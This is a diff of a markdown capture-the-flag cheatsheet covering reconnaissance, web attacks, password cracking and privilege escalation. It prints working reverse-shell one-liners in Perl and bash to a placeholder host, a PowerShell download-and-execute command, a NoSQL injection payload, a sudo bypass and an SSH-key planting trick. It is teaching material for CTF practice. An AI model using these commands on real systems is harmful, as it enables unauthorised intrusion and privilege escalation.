@@ -1,30 +1,66 @@
----
-header:
-  
-layout: single
-classes: wide
-author_profile: false
-categories:
-  - Hacking
-tags:
-  - capture-the-flag
-  - ctf
-  - hacking
-  - cryptography
-  - web-security
-  - image-forensics
-  - Pentesting
-  - system-hacking
-  - ctf-cheatsheet
-toc: true
-toc_sticky: true
-toc_label: "Table of Contents"
+# Awesome CTF Cheatsheet [![Awesome](https://awesome.re/badge-flat.svg)](https://awesome.re)[<img src="media/icons8-hacking.svg" align="right" width="150">](https://uppusaikiran.github.io/hacking/Capture-the-Flag-CheatSheet/)
+
+
+> A currated list of all capture the flag tips and strategies to solve Online CTF challenges and Hackthebox Machines.
+
+
 
 ---
 
-#### [![contributions welcome](https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat)](https://github.com/uppusaikiran/awesome-ctf-cheatsheet/issues) 
+## Contents
 
-[![HitCount](http://hits.dwyl.com/uppusaikiran/awesome-ctf-cheatsheet.svg)](http://hits.dwyl.com/uppusaikiran/awesome-ctf-cheatsheet) ![GitHub stars](https://img.shields.io/github/stars/uppusaikiran/awesome-ctf-cheatsheet?style=social)
+<!-- toc -->
+
+- [System Hacking](#system-hacking)
+  - [Nmap Scanning](#nmap-scanning)
+  - [Netdiscover Scanning](#netdiscover-scanning)
+  - [Nikto Scanning](#nikto-scanning)
+  - [WebServer is Open](#webserver-is-open)
+  - [Directory Bursting](#directory-bursting)
+  - [Generating Wordlist from the Website](#generating-wordlist-from-the-website)
+  - [SMB is Open](#smb-is-open)
+  - [To Extract and Mount VHD Drive Files](#to-extract-and-mount-vhd-drive-files)
+  - [To search for Exploits on Metasploit by Name](#to-search-for-exploits-on-metasploit-by-name)
+  - [Wordpress Open](#wordpress-open)
+  - [RPC Open](#rpc-open)
+  - [Powershell](#powershell)
+  - [NOSql Code Injection](#nosql-code-injection)
+- [Web Hacking](#web-hacking)
+  - [Five Stages of Web Hacking](#five-stages-of-web-hacking)
+  - [Enumeration and Reconnaissance Tools](#enumeration-and-reconnaissance-tools)
+  - [Scanning](#scanning)
+  - [Payloads](#payloads)
+  - [Shells](#shells)
+  - [BufferOverflow](#bufferoverflow)
+  - [Gobuster](#gobuster)
+  - [SQLMAP](#sqlmap)
+- [File Hacking](#file-hacking)
+  - [Extract hidden text from PDF Files](#extract-hidden-text-from-pdf-files)
+  - [Compress File Extraction](#compress-file-extraction)
+  - [Extract hidden strings](#extract-hidden-strings)
+- [Cryptography](#cryptography)
+  - [Caesar Cipher](#caesar-cipher)
+  - [Vigenere Cipher](#vigenere-cipher)
+  - [One Time Pad Cipher](#one-time-pad-cipher)
+- [Forensics](#forensics)
+  - [Image File](#image-file)
+  - [Binwalk](#binwalk)
+  - [Extract NTFS Filesystem](#extract-ntfs-filesystem)
+  - [Recover Files from Deleted File Systems](#recover-files-from-deleted-file-systems)
+  - [Packet Capture](#packet-capture)
+  - [JavaScript Deobfuscator](#javascript-deobfuscator)
+- [Password Cracking](#password-cracking)
+  - [JOHN the ripper](#john-the-ripper)
+  - [SAM Hashes](#sam-hashes)
+  - [Linux User Hashes](#linux-user-hashes)
+  - [Hashcat](#hashcat)
+  - [7z Password Cracking](#7z-password-cracking)
+  - [SSH Password Cracking](#ssh-password-cracking)
+- [Privilige Escalation](#privilige-escalation)
+  - [Standard Scripts for Enumeration](#standard-scripts-for-enumeration)
+  - [Reconnoitre](#reconnoitre)
+
+<!-- tocstop -->
 
 ## System Hacking 
 
@@ -77,10 +113,55 @@ To scan for vulnerabilities use Nikto.
 
 If Port 80 or 443 is open, we can look for robots.txt to check for hidden flags or clues.
 
-To find the Webserver version, Use Curl tool.
+To find the Webserver version, Use Curl tool with `I` flag.
 ```
-> $ curl --header <SERVER_IP>
+> $ curl -I <SERVER_IP>
+HTTP/1.1 200 OK
+Date: Mon, 11 May 2020 05:18:21
+Server: gws
+Last-Modified: Mon, 11 May 2020 05:18:21
+Content-Length: 4171
+Content-Type: text/html
+Connection: Closed
 ```
+
+If Port 80 is Closed and its the only port opened on the machine, it can be due to presence of IDS or Port knocking.
+- We can give a timeout and try scanning after sometime to check if the port is still closed.
+- To check if Port is Open without knocking on IDS using TCP Scan instead of SYN Scan.
+```
+> $ nmap -p 80 <SERVER_IP> -sT
+Starting Nmap 7.80 ( https://nmap.org ) 
+Nmap scan report for 10.10.10.168
+Host is up (0.038s latency).
+
+PORT     STATE  SERVICE
+80/tcp   closed http
+Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds
+```
+
+### Directory Bursting
+
+To enumerate directories on a webserver, Use wfuzz.
+
+```
+> $ wfuzz -u http://<SERVER_IP>/FUZZ/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+
+********************************************************
+* Wfuzz 2.4.5 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://<SERVER_IP>/FUZZ/
+```
+
+### Generating Wordlist from the Website
+
+```
+> $ cewl -w wordlist.txt -d 10 -m 1 http://<SERVER_IP>/
+
+$ wc wordlist.txt 
+ 354  354 2459 wordlist.txt
+```
+
 
 ### SMB is Open
 
@@ -148,7 +229,7 @@ Listing archive: <FILENAME>.vhd
 > $ searchsploit apache 1.2.4
 ```
 
-## Wordpress Open
+### Wordpress Open
 
 If `/wp-login.php` is found in the Enumeration scanning, it can be Wordpress site.
 
@@ -185,6 +266,12 @@ To bypass execution policy
 > $ powershell.exe -exec bypass
 ```
 
+### NOSql Code Injection
+
+```
+username[$ne]=help&password[$ne]=help&login=login
+```
+
 ## Web Hacking
 
 ### Five Stages of Web Hacking
@@ -201,7 +288,7 @@ To bypass execution policy
 
 - Whois, Nslookup, Dnsrecon, Google Fu, Dig - To passively enumerate website.
 - [Sublist3r](https://github.com/aboul3la/Sublist3r) - Subdomains enumeration tool.
-- [crt.sh](http://crt.sh) - Certificate enumeration tool.
+- [crt.sh](https://crt.sh) - Certificate enumeration tool.
 - [Hunter.io](https://hunter.io/) - Email enumeration tool.
 - Nmap, Wappalyzer, Whatweb, Builtwith, Netcat - Fingerprinting tools.
 - HaveIbeenPwned - Useful for breach enumeraton.
@@ -267,6 +354,16 @@ To use bind shell, we have to follow two steps: 1, Create a Bind Shell 2,Listen 
 > $ nc -lvp <ATTACKER_PORT>
 ```
 
+If website is launching perl reverse shell, we can modify it to get better shell using Bash oneliner.
+
+```
+> $ perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"<HOST_IP>:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};' 2>&1
+```
+
+```
+> $ bash -c 'bash -i &> /dev/tcp/<HOST_IP>/9001 0>&1'
+```
+
 ### BufferOverflow
 To generate shellcode quickly, we can use python `pwn` library.
 ```
@@ -277,7 +374,16 @@ To generate shellcode quickly, we can use python `pwn` library.
 > $ (python -c "import pwn;print(pwn.asm(pwn.shellcraft.linux.sh()))" ;cat) | ./vuln
 ```
 
-### Gobuster with Cookie (Useful to directory traversal when cookie is needed )
+### Gobuster
+
+Normal Enumeration.
+
+```
+> $ gobuster dir -u http://<IP_ADDRESS> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+
+```
+
+With Cookie (Useful to directory traversal when cookie is needed).
 ```
 > $ gobuster dir -u http://<IP_ADDRESS> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -c PHPSESSID=<COOKIE_VALUE>
 ===============================================================
@@ -303,12 +409,12 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 Redirect the HTTP Request to Burpsuite and we can see the request like this.
 ```
 POST / HTTP/1.1
-Host: 10.10.10.162
+Host: <IP_ADDRESS>
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
-Referer: https://10.10.10.162/
+Referer: https://<IP_ADDRESS>/
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 11
 Connection: close
@@ -398,6 +504,11 @@ To break Vigenere ciphers without knowing the key.
 ### One Time Pad Cipher
 To solve One Time Pad, Use [OTP](http://rumkin.com/tools/cipher/otp.php).
 
+
+```
+> $ /usr/share/john/ssh2john.py id_rsa > output.hash
+```
+
 ## Forensics
 
 ### Image File
@@ -477,7 +588,7 @@ If there is `JOHN` in the title or text or hint, its mostly reference to `JOHN t
 > $ john <HASHES_FILE> --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-To crack well known hashes, use [Link](https://hashes.org)
+To crack well known hashes, use [Link](https://crackstation.net/)
 
 ### SAM Hashes
 
@@ -516,22 +627,34 @@ To crack the password, we can use `hashcat` here 500 is for format `$1$` Replace
 > $ hashcat -m 500 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt --force
 ```
 
+### 7z Password Cracking
+
+To extract 7z password, Use tool `7z2john`
+
+### SSH Password Cracking
+
+To crack encrypted ssh key use `ssh2john` tool.
+
 ## Privilige Escalation
 
 ### Standard Scripts for Enumeration
 - [Linux Priv Checker](https://github.com/sleventyeleven/linuxprivchecker) - Linux Privilige Enumeration Checker.
+- [Awesome Priv](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
 - [Lin Enum Script](https://github.com/rebootuser/LinEnum)
 - [Unix Priv Check](https://github.com/pentestmonkey/unix-privesc-check)
+- [Pspy](https://github.com/DominicBreuker/pspy) - Information on cronjobs, proceses on target system.
+- [JAWS](https://github.com/411Hall/JAWS) - Windows Enumeration Script.
+- [Cyberchef](https://github.com/gchq/CyberChef) - A web app for encryption, encoding, compression and data analysis.
 - [Pspy](https://github.com/DominicBreuker/pspy) - Gather information on cron, proceses.
 - [Gtfobins](https://gtfobins.github.io/) - If we dont exactly remember how to use a given setuid command to get Privliges.
 
-### Dirtycow 
+#### Dirtycow 
 
 On older linux kernals, we can gain root access using dirtycow exploit.
 
 To Use DirtyCow : [Link](https://dirtycow.ninja/) - Maybe more specifically : [Dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c)
 
-### Sudo 
+#### Sudo 
 
 To check what sudo command can the current user run with no-password.
 
@@ -540,6 +663,7 @@ To check what sudo command can the current user run with no-password.
 ```
 
 Examples:
+
 ```
 > $ sudo -l
 User www-data may run the following commands on bashed:
@@ -552,7 +676,45 @@ id
 uid=1001(enemy) gid=1001(enemy) groups=1001(enemy)
 ```
 
-### Gain More Privilige on windows system
+```
+> $ sudo -l
+[sudo] password for username: 
+Matching Defaults entries for username on Victim:
+  env_reset, mail_badpass,
+  secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+ 
+  User username may run the following commands on Victim:
+    (ALL : ALL) ALL
+> $ cat /root/root.txt
+cat: /root/root.txt: Permission denied  - Does not work
+> $ sudo cat /root/root.txt  - Work
+```
+
+```
+user@host:~$ sudo -l
+sudo -l
+Matching Defaults entries for user on host:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User user may run the following commands on host:
+    (ALL, !root) /bin/bash
+
+user@host:~$ sudo -u#-1 /bin/bash
+sudo -u#-1 /bin/bash
+Password: Password
+
+Sorry, try again.
+Password: <Enter Password>
+
+root@host:/home/user# id
+id
+uid=0(root) gid=1001(user) groups=1001(user)
+
+```
+
+
+#### Gain More Privilige on windows system
 - In meterpreter shell try `getsystem`
 - In meterpreter shell try `background` and then follow rest of commands.
 - search suggester
@@ -577,14 +739,14 @@ To get Shell on Windows use [Unicorn](https://github.com/trustedsec/unicorn.git)
 msf5 exploit(multi/handler) >         
 ```
 
-### MYSQL with Sudo Privilage
+#### MYSQL with Sudo Privilage
 
 To get Shell from MYSQL
 ```
 mysql> \! /bin/sh
 ```
 
-### VIM Editor with Sudo Privilage
+#### VIM Editor with Sudo Privilage
 
 To get Shell from VIM.
 
@@ -599,7 +761,7 @@ Method-2:
 Type Escape and enter :!/bin/bash
 ```
 
-### Cronjob
+#### Cronjob
 
 If some system cron is getting some url present in the file, we can replace url to get flag as below.
 ```
@@ -617,9 +779,9 @@ Nov 19 00:05:01 sun CRON[5701]: (root) CMD (python /home/sun/Documents/script.py
 ```
 
 
-### More or Less Command 
+#### More or Less Command 
 
-- If any file we found in low priv user and it contains something like this, we can execute it and minimize the size of terminal to enter the visual mode and enter `!/bin/bash` to get root shell.
+- If any file we found in low priv user and it contains something like this, we can execute it and minimize the size of terminal to enter the visual mode to gain root access.
 
 ```
 > $ cat new.sh 
@@ -627,8 +789,7 @@ Nov 19 00:05:01 sun CRON[5701]: (root) CMD (python /home/sun/Documents/script.py
 /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
 ```
 
-
-```  
+```
 > $ sh new.sh 
 -- Logs begin at Sun 2019-11-17 19:19:25 EST, end at Mon 2019-11-18 17:13:44 EST. --
 Nov 18 17:02:26 kali sudo[11538]: pam_unix(sudo:auth): authentication failure; logname= uid=33 eu
@@ -640,7 +801,7 @@ Nov 18 17:02:29 kali crontab[11595]: (www-data) LIST (www-data)
 root # 
 ```
 
-### Improve Shell
+#### Improve Shell
 To get the better Shell after taking control of the system.
 ```
 www-data@machine:/var/www/html$ python3 -c "import pty;pty.spawn('/bin/bash')"
@@ -653,16 +814,31 @@ root@kali:# nc -nlvp 443
 www-data@machine:/var/www/html$ export TERM=xterm
 ```
 
-### Transfer Files from Host to Target Machine
+#### Transfer Files from Host to Target Machine
 - Use `python -m SimpleHTTPServer` in the host folder.
 - Use Apache and put files in `/var/www/html/` folder.
 - If Tomcat is Opened, upload the file/payload using the Admin panel.
 - If wordpress is running, upload the file as plugin.
 - In Windows Victim, use `certutil -urlcache -f http://<HOST_IP>/<FILE_NAME> <OUTPUT_FILE_NAME>`
+- In Windows, Using Powershell: `PS C:\Users\User\Desktop> IEX(New-Object Net.WebClient).downloadString('http://<HOST_IP>:8000/jaws-enum.ps1')`
 
 
+#### FTP
 
-## Tools
+If we were able to access FTP, we can upload SSH Key to login without password.
+```
+ > $ ftp <HOST_IP>
+Connected to <HOST_IP>.
+220 ProFTPD 1.3.5a Server (Debian) [::ffff:<HOST_IP>]
+Name (<HOST_IP>:root): notch
+331 Password required for notch
+Password:
+230 User notch logged in
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> put id_rsa.pub
+ftp> rename id_rsa.pub authorized_keys
+```
 
 ### Reconnoitre
 Security tool for multithreaded information gathering and service enumeration whilst building directory structures to store results, along with writing out recommendations for further testing.
@@ -670,15 +846,3 @@ Security tool for multithreaded information gathering and service enumeration wh
 ```
 > $ reconnoitre -t 10.10.10.37 -o `pwd` --services`
 ```
-
-- Total Commander - multi purpose terminal for Hacking. Link : www.ghisler.com
-- CTF Exploitation Framework : GitHub.com/Gallopsled/pwntools `pip install pwntools`
-- When using GDB, we can create "~/.gdbinit" file and add this line "set disassembly-flavor intel" to make intel synatx.
-- Dirbuster for enumeration web server Attacks.
-- [Gobuster](https://github.com/OJ/gobuster) - Used for advanced enumeration.
-- [Nmap Automator](https://github.com/21y4d/nmapAutomator)
-- 7z Password Cracking: Use tool `7z2john`
-- SSH Password Cracking: `/usr/share/john/ssh2john.py id_rsa > output.hash`
-- [Quipqiup - Substitution Cipher Solver](https://quipqiup.com/)
-- [GDB Peda](https://github.com/longld/peda)
-- [Search Code - Based on Funcion name and code-snippet](https://searchcode.com/)
